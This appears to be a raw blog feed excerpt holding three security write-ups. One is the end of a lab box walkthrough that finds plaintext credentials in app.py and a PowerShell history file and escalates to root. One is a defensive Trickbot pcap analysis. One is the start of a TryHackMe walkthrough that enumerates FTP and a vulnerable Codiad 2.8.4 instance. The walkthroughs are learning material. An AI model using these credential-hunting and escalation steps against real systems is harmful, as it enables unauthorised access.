&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;shell-as-jack&quot;&gt;&lt;strong&gt;Shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jack&lt;/code&gt;&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;Locally enumerating divulges that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jack&lt;/code&gt;’s password stored in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app.py&lt;/code&gt; at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/blog/&lt;/code&gt; directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@reconstruction:~/blog&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;pass&quot;&lt;/span&gt; app.py
&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;pass&quot;&lt;/span&gt; app.py
import getpass
&lt;span class=&quot;c&quot;&gt;#ADMIN_PASSWORD = &apos;ee05d64d2528102d45e2db60986727ed&apos; # jack password&lt;/span&gt;
ADMIN_PASSWORD &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;1edfa9b54a7c0ec28fbc25babb50892e&apos;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;request.method &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;POST&apos;&lt;/span&gt; and request.form.get&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;password&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
        password &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; request.form.get&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;password&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# password and do the comparison on the hashed versions.&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;password &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; app.config[&lt;span class=&quot;s1&quot;&gt;&apos;ADMIN_PASSWORD&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;:
            flash&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Incorrect password.&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;danger&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With this password, we can &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt; our way in as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jack&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;system-compromised&quot;&gt;&lt;strong&gt;System Compromised&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;Once again, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;’s password is located under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/jack/local/share/powershell/PSReadLine/ConsoleHost_history.txt&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jack@reconstruction:~/.local/share/powershell/PSReadLine&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;ConsoleHost_history.txt 
Write-Host &lt;span class=&quot;nt&quot;&gt;-ForegroundColor&lt;/span&gt; Green &lt;span class=&quot;nt&quot;&gt;-BackgroundColor&lt;/span&gt; White Holy &lt;span class=&quot;k&quot;&gt;****&lt;/span&gt; this works!
Write-Host &lt;span class=&quot;nt&quot;&gt;-ForegroundColor&lt;/span&gt; Red &lt;span class=&quot;nt&quot;&gt;-BackgroundColor&lt;/span&gt; Black Holy &lt;span class=&quot;k&quot;&gt;****&lt;/span&gt; this works as well!
su FlauntHiddenMotion845 &lt;span class=&quot;c&quot;&gt;# root password&lt;/span&gt;
clear &lt;span class=&quot;nb&quot;&gt;history
&lt;/span&gt;clear
cls
&lt;span class=&quot;nb&quot;&gt;exit
&lt;/span&gt;jack@reconstruction:~/.local/share/powershell/PSReadLine&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su - root
Password: FlauntHiddenMotion845
root@reconstruction:~# &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="red" /><category term="pg" /><category term="linux" /><summary type="html">Executive Summary</summary></entry><entry><title type="html">2018-10-31 - Traffic Analysis</title><link href="https://jayngng.github.io/blog/2018-10-31-traffic-analysis/" rel="alternate" type="text/html" title="2018-10-31 - Traffic Analysis" /><published>2021-10-26T21:20:23+11:00</published><updated>2021-10-26T21:20:23+11:00</updated><id>https://jayngng.github.io/blog/2018-10-31---traffic-analysis</id><content type="html" xml:base="https://jayngng.github.io/blog/2018-10-31-traffic-analysis/">&lt;h2 id=&quot;description&quot;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Traffic analysis on 2018-10-31.&lt;/p&gt;

&lt;p&gt;-&amp;gt; Link to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pcap&lt;/code&gt;: &lt;a href=&quot;https://www.malware-traffic-analysis.net/2018/10/31/2018-10-31-traffic-analysis-exercise.pcap.zip&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;-&amp;gt; Password: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;infected&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Credit:&lt;/strong&gt; www.malware-traffic-analysis.net&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;executive-summary&quot;&gt;&lt;strong&gt;Executive Summary&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;On 2018-10-31 15:34:11 UTC, Ichabod Crane’s computer was infected via opening and executing a Trickbot malware. After the incident was reported, the SOC team immediately contacted with Ichabod Crane to start investigating the incident.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;infection-overview&quot;&gt;&lt;strong&gt;Infection Overview&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Date and time of the activity (in GMT or UTC)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2018/10/31 15:34:11 PM&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;The account name or username from the infected Windows computer&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ichabod.crane&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;The host name of the infected Windows computer&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HEADLESS-PC&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;The MAC address of the infected Windows computer&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HewlettP_2a:96:0a (00:50:8b:2a:96:0a)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;SHA256 file hashes for any malware from the pcap&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;396223eeec49493a52dd9d8ba5348a332bf064483a358db79d8bb8d22e6eb62c&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;What type of infection this is&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Trickbot Malware&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;traffic-analysis&quot;&gt;&lt;strong&gt;Traffic Analysis&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Firstly, we’re recommended to inspect the &lt;strong&gt;Statistics&lt;/strong&gt; section for a better vision over the traffic.&lt;/p&gt;

&lt;p&gt;Within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt; interface, we navigate to &lt;strong&gt;Statistics&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Protocol Hierarchy&lt;/strong&gt; to inspect common traffic protocols.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20181031/1.png&quot; title=&quot;20181031/1.png&quot; alt=&quot;20181031/1.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;As we can see, most communications took place under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP&lt;/code&gt; protocol.&lt;/p&gt;

&lt;p&gt;Let’s also look at the “ipv4 addresses” statistic. To do so, we navigate to &lt;strong&gt;Statistics&lt;/strong&gt; -&amp;gt; &lt;strong&gt;IP Addresses&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20181031/2.png&quot; title=&quot;20181031/2.png&quot; alt=&quot;20181031/2.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Those highlighted ip addresses account for a large portion of traffic, which is prioritized as our target of investigation. The others are also worth to check out.&lt;/p&gt;

&lt;p&gt;We’ll begin with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http&lt;/code&gt; traffic as usual.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Search query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http.request&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Follow TCP Stream&lt;/code&gt; of the packet &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;679&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20181031/3.png&quot; title=&quot;20181031/3.png&quot; alt=&quot;20181031/3.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;We should see something similar to the follows:&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20181031/4.png&quot; title=&quot;20181031/4.png&quot; alt=&quot;20181031/4.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.100.9.107&lt;/code&gt; address downloaded a Windows executable from an unknown source.&lt;/p&gt;

&lt;p&gt;If we export the executable and submit it onto &lt;a href=&quot;https://www.virustotal.com/gui/file/396223eeec49493a52dd9d8ba5348a332bf064483a358db79d8bb8d22e6eb62c&quot;&gt;VirusTotal&lt;/a&gt; …&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20181031/5.png&quot; title=&quot;20181031/5.png&quot; alt=&quot;20181031/5.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;The file is flagged as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Trickbot&lt;/code&gt; malware by multiple vendors!.&lt;/p&gt;

&lt;p&gt;Now, we can safely conclude that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.100.9.107&lt;/code&gt; is the victim of malware attack.&lt;/p&gt;

&lt;p&gt;Additionally, we also discover various post-exploitation activities being done by attackers.&lt;/p&gt;

&lt;p&gt;For instance, the communications with CnC for data exfiltration.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20181031/6.png&quot; title=&quot;20181031/6.png&quot; alt=&quot;20181031/6.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Inspecting one of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt; requests, we can see, i.e. &lt;strong&gt;system process&lt;/strong&gt; is exfiltrated.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20181031/7.png&quot; title=&quot;20181031/7.png&quot; alt=&quot;20181031/7.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Others, attackers pivot and exploit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EternalBlue&lt;/code&gt; vulnerability on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.100.9.4&lt;/code&gt;, demonstrated via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP stream 69&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20181031/8.png&quot; title=&quot;20181031/8.png&quot; alt=&quot;20181031/8.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Security Onion&lt;/code&gt; is also a great way to start. In the below image, we can efficiently hunt for threats based on the alert rules from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;suricata&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zeek&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/20181031/9.png&quot; title=&quot;20181031/9.png&quot; alt=&quot;20181031/9.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Basically, above information is adequate to conclude that organization’s network is attacked, further actions needed to keep attackers away from critical infrastructures.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;</content><author><name></name></author><category term="soc" /><category term="traffic_analysis" /><category term="blue" /><summary type="html">Description Traffic analysis on 2018-10-31.</summary></entry><entry><title type="html">IDE - THM</title><link href="https://jayngng.github.io/blog/ide-thm/" rel="alternate" type="text/html" title="IDE - THM" /><published>2021-10-19T01:23:14+11:00</published><updated>2021-10-19T01:23:14+11:00</updated><id>https://jayngng.github.io/blog/ide---thm</id><content type="html" xml:base="https://jayngng.github.io/blog/ide-thm/">&lt;h2 id=&quot;summary&quot;&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;In this box, we’ll exploit a vulnerable web application running on a &lt;strong&gt;higher port&lt;/strong&gt; to retain an initial access on the target system. Enumerating target’s system locally divulges a plaintext password of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;drac&lt;/code&gt; - a lcoal user. Privilege escalation is achieved via a misconfigured &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.service&lt;/code&gt; file.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h2&gt;

&lt;h4 id=&quot;nmap&quot;&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Let’s begin with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/services &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 61 vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.4.1.61
|      Logged &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session &lt;span class=&quot;nb&quot;&gt;timeout &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp    open  http    syn-ack ttl 61 Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Apache2 Ubuntu Default Page: It works
62337/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-favicon: Unknown favicon MD5: B4A327D2242C42CF2EE89C623279665F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS 
|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
|_http-title: Codiad 2.8.4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are a few opened services. We will start with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ftp-enumeration&quot;&gt;&lt;strong&gt;FTP Enumeration&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;With the credentials &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous:anonymous&lt;/code&gt;, we successfully logged in as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt; user.&lt;/p&gt;

&lt;p&gt;Listing all the shares, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;...&lt;/code&gt; directory stands out the most interesting to us.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 18 06:10 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x    3 0        114          4096 Jun 18 06:10 ..
drwxr-xr-x    2 0        0            4096 Jun 18 06:11 ...
226 Directory send OK.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ...
250 Directory successfully changed.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Navigating to the directory and listing shares again, we notice a suspicious-looking file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;    1 0        0             151 Jun 18 06:11 -
drwxr-xr-x    2 0        0            4096 Jun 18 06:11 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x    3 0        114          4096 Jun 18 06:10 ..
226 Directory send OK.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Download it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get \-&lt;/code&gt;. Here is it’s content:&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Hey john,                                                                          
I have reset the password as you have asked. Please use the default password to log
in.                                                                                
Also, please take care of the image file ;)                                        
&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; drac.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It appears that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;drac&lt;/code&gt; are potential users in the target system.&lt;/p&gt;

&lt;p&gt;There are two &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; services from the earlier scan. Within the scope of this writeup, we drop our attention on the “&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;62337&lt;/code&gt;”.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;http-port-62337&quot;&gt;&lt;strong&gt;HTTP port 62337&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Navigate to the site, we discovered the website is running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Codiad v2.8.4&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://10.10.190.116:62337
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                            1 ⚙ 
&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;doctype html&amp;gt;                                                                    
                                                                                   
&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                             
    &amp;lt;meta &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                         
    &amp;lt;meta &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;viewport&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;width=device-width, initial-scale=1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;           
    &amp;lt;title&amp;gt;Codiad 2.8.4&amp;lt;/title&amp;gt; 
...[snip]...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Conducting a quick research, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Codiad 2.8.4&lt;/code&gt; is known to be vulnerable to &lt;strong&gt;Authenticated Remote Code Execution&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit codiad                                                    1 ⨯ 1 ⚙
&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                   |  Path
&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
...[snip]...

Codiad 2.8.4 - Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | multiple/webapps/49705.py

...[snip]...
&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h2&gt;

&lt;h4 id=&quot;weak-password&quot;&gt;&lt;strong&gt;Weak Password&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Recalling the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&lt;/code&gt; file, which reveals &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;drac&lt;/code&gt; users, we then attempt to guess weak and common passwords against those users.&lt;/p&gt;

